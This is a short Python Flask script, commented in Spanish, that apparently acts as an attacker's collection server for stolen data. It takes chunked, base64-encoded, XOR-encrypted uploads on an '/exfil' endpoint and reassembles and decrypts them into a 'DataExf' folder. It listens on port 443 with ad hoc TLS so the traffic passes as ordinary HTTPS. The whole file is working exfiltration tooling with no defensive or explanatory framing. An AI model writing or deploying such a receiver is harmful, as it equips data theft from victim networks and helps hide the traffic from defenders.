from flask import Flask, request
import os
import base64

app = Flask(__name__)
output_dir = "DataExf"
os.makedirs(output_dir, exist_ok=True)

chunks = {}

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

@app.route('/exfil', methods=['POST'])
def exfil():
    chunk_id = request.headers.get("X-Chunk-ID")
    if chunk_id is None:
        return "Falta el encabezado X-Chunk-ID", 400

    try:
        chunk_id = int(chunk_id)
    except ValueError:
        return "X-Chunk-ID inválido", 400

    data = request.data
    chunks[chunk_id] = data
    print(f"[✓] Fragmento {chunk_id} recibido ({len(data)} bytes)")
    return "OK", 200

@app.route('/ensamblaje', methods=['POST'])
def ensamblar():
    key = request.form.get("key")
    if not key:
        return "Falta la clave XOR", 400

    if not chunks:
        return "No hay fragmentos para ensamblar", 400

    ensamblado_b64 = b''.join(chunks[i] for i in sorted(chunks.keys()))
    try:
        cifrado = base64.b64decode(ensamblado_b64)
    except Exception as e:
        return f"Error al decodificar base64: {e}", 500

    try:
        descifrado = xor_decrypt(cifrado, key.encode())
    except Exception as e:
        return f"Error al aplicar XOR: {e}", 500

    output_path = os.path.join(output_dir, "archivo_recuperado.bin")
    with open(output_path, "wb") as f:
        f.write(descifrado)

    return f"[✓] Archivo recuperado y guardado en: {output_path}", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context='adhoc')
